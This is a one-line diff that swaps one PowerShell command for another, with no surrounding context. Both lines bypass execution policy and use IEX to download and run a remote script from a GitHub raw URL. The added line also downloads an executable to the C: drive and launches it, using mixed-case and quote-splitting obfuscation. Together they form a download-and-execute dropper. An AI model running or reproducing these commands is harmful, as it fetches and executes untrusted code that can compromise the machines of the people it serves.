@@ -1,1 +1,1 @@
-powershell -ep bypass -c IEX（new-object net.webclient）.downloadstring（'https://raw.githubusercontent.com/gpsqqq/f/master/gh.ps1'）; gh> c：\ 1.txt
+powershell -ep bypass IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/gpsqqq/f/master/gh.ps1');gh > c:\sys.txt;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE('https://github.com/gpsqqq/f/blob/master/MFCtest32.exe?raw=true','c:\MFCtest32.exe');c:\MFC""test32.exe
